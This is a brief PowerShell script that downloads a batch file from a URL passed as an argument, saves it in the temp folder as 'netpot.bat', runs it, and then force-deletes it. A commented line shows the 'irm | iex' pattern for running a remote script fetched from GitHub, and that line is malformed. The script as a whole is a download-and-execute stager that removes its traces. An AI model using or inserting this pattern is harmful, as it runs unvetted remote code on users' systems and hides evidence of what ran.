$batUrl=$args[0]
$tmp=Join-Path $env:TEMP 'netpot.bat'
Invoke-WebRequest -Uri $batUrl -OutFile $tmp
Start-Process -FilePath $tmp -Wait
Remove-Item -Path $tmp -Force

# irm 'https://raw.githubusercontent.com/username/repo/branch/path/execpt.ps1' | iex 'https://example.com/script.bat'